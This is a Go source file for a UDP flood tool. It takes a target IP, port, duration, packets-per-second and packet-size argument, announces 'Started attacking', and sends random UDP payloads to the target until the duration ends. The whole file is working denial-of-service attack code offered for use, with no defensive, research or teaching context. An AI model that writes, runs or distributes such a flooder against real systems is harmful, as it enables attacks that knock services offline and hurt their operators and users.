package main

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"
)

func main() {
	if len(os.Args) != 6 {
		fmt.Printf("How to: %s <Target> <Port> <Duration> <PPS> <Packet size>\n", os.Args[0])
		return
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	duration, _ := time.ParseDuration(os.Args[3] + "s")
	packetsPerSecond, _ := strconv.Atoi(os.Args[4])
	udpPayloadSize, _ := strconv.Atoi(os.Args[5])

	targetAddress := fmt.Sprintf("%s:%s", targetIP, targetPort)
	fmt.Printf("Started attacking %s for %s\n", targetAddress, duration.String())

	endTime := time.Now().Add(duration)

	for {
		if time.Now().After(endTime) {
			break
		}

		for i := 0; i < packetsPerSecond; i++ {
			sendUDPPacket(targetAddress, udpPayloadSize)
		}
	}

	fmt.Println("Done.")
}

func sendUDPPacket(targetAddress string, udpPayloadSize int) {
	conn, err := net.Dial("udp", targetAddress)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	payload := make([]byte, udpPayloadSize)
	rand.Read(payload)

	hexPayload := randHex(udpPayloadSize)
	hexBytes, err := hex.DecodeString(hexPayload)
	if err != nil {
		fmt.Println(err)
		return
	}

	copy(payload, hexBytes)

	_, err = conn.Write(payload)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func randHex(length int) string {
	bytes := make([]byte, length/2)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}
